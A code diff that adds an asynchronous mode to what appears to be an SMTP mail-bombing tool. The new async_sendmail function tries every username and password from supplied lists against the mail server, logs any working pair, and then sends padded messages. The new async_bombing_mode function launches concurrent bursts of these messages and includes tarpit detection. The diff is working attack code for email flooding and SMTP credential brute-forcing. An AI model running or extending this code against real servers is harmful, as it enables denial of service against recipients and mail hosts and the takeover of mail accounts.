@@ -5,6 +5,7 @@ import socket  # noqa: F401 - used by tests for monkeypatching
 import time
 import sys
 import logging
+import asyncio
 from smtplib import (
     SMTPException,
     SMTPSenderRefused,
@@ -18,6 +19,11 @@ from pathlib import Path
 from urllib.parse import urlsplit
 import ipaddress
 
+try:  # pragma: no cover - optional dependency
+    import aiosmtplib
+except ImportError:  # pragma: no cover - dependency may be missing
+    aiosmtplib = None
+
 from .config import Config
 from . import datagen
 from . import attacks
@@ -30,6 +36,13 @@ def throttle(cfg: Config, delay: float = 0.0) -> None:
     total = cfg.SB_GLOBAL_DELAY + delay
     if total > 0:
         time.sleep(total)
+
+
+async def async_throttle(cfg: Config, delay: float = 0.0) -> None:
+    """Asynchronous variant of :func:`throttle`."""
+    total = cfg.SB_GLOBAL_DELAY + delay
+    if total > 0:
+        await asyncio.sleep(total)
 
 
 def append_message(cfg: Config, attachments: Optional[List[str]] = None) -> bytes:
@@ -234,6 +247,78 @@ def sendmail(
             SB_FAILCOUNT.value,
             cfg.SB_STOPFQNT,
         )
+
+
+async def async_sendmail(
+    number: int,
+    burst: int,
+    fail_count,
+    message: bytes,
+    cfg: Config,
+    server: str | None = None,
+    users=None,
+    passwords=None,
+    use_ssl: bool | None = None,
+    start_tls: bool | None = None,
+):
+    """Asynchronous equivalent of :func:`sendmail`."""
+
+    if aiosmtplib is None:  # pragma: no cover - dependency missing
+        raise RuntimeError("aiosmtplib is required for async mode")
+
+    if server is None:
+        server = cfg.SB_SERVER
+    if use_ssl is None:
+        use_ssl = cfg.SB_SSL
+    if start_tls is None:
+        start_tls = cfg.SB_STARTTLS
+
+    if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
+        return
+
+    logger.info("%s/%s, Burst %s : Sending Email", number, cfg.SB_TOTAL, burst)
+    host, port = parse_server(server)
+
+    smtp = aiosmtplib.SMTP(hostname=host, port=port, timeout=cfg.SB_TIMEOUT, use_tls=use_ssl)
+    try:
+        await smtp.connect()
+        if start_tls and not use_ssl:
+            await smtp.starttls()
+        if users and passwords:
+            success = False
+            for user in users:
+                for pwd in passwords:
+                    try:
+                        await smtp.login(user, pwd)
+                        logger.info("Auth success: %s:%s", user, pwd)
+                        success = True
+                        break
+                    except aiosmtplib.SMTPException:
+                        continue
+                if success:
+                    break
+        start_t = time.monotonic()
+        await smtp.sendmail(cfg.SB_SENDER, cfg.SB_RECEIVERS, message)
+        latency = time.monotonic() - start_t
+        if latency > cfg.SB_TARPIT_THRESHOLD:
+            logger.warning("Possible tarpit detected: %.2fs latency", latency)
+        logger.info("%s/%s, Burst %s : Email Sent", number, cfg.SB_TOTAL, burst)
+    except aiosmtplib.SMTPException:
+        fail_count.value += 1
+        logger.error(
+            "%s/%s, Burst %s/%s : Failure %s/%s, Unable to send email",
+            number,
+            cfg.SB_TOTAL,
+            burst,
+            cfg.SB_BURSTS,
+            fail_count.value,
+            cfg.SB_STOPFQNT,
+        )
+    finally:
+        try:
+            await smtp.quit()
+        except Exception:  # pragma: no cover - cleanup best effort
+            pass
 
 
 def parse_server(server: str) -> Tuple[str, int]:
@@ -504,6 +589,57 @@ def bombing_mode(cfg: Config, attachments: Optional[List[str]] = None) -> None:
         for proc in procs:
             proc.join()
         throttle(cfg, cfg.SB_BURSTSPSEC)
+
+    if cfg.SB_RAND_STREAM:
+        try:
+            cfg.SB_RAND_STREAM.close()
+        except Exception:
+            pass
+
+
+async def async_bombing_mode(
+    cfg: Config, attachments: Optional[List[str]] = None
+) -> None:
+    """Asynchronous burst sending using ``asyncio``."""
+
+    logger.info("Generating %s of data to append to message", sizeof_fmt(cfg.SB_SIZE))
+
+    class Counter:
+        def __init__(self):
+            self.value = 0
+
+    fail_count = Counter()
+    message = append_message(cfg, attachments)
+    logger.info("Message using %s of random data", sizeof_fmt(sys.getsizeof(message)))
+
+    for b in range(cfg.SB_BURSTS):
+        if cfg.SB_PER_BURST_DATA:
+            message = append_message(cfg, attachments)
+        numbers = range(1, cfg.SB_SGEMAILS + 1)
+        tasks = []
+        if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
+            break
+        for number in numbers:
+            if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
+                break
+            await async_throttle(cfg, cfg.SB_SGEMAILSPSEC)
+            tasks.append(
+                asyncio.create_task(
+                    async_sendmail(
+                        number + (b * cfg.SB_SGEMAILS),
+                        b + 1,
+                        fail_count,
+                        message,
+                        cfg,
+                        server=cfg.SB_SERVER,
+                        users=cfg.SB_USERLIST,
+                        passwords=cfg.SB_PASSLIST,
+                    )
+                )
+            )
+        if tasks:
+            await asyncio.gather(*tasks)
+        await async_throttle(cfg, cfg.SB_BURSTSPSEC)
 
     if cfg.SB_RAND_STREAM:
         try:
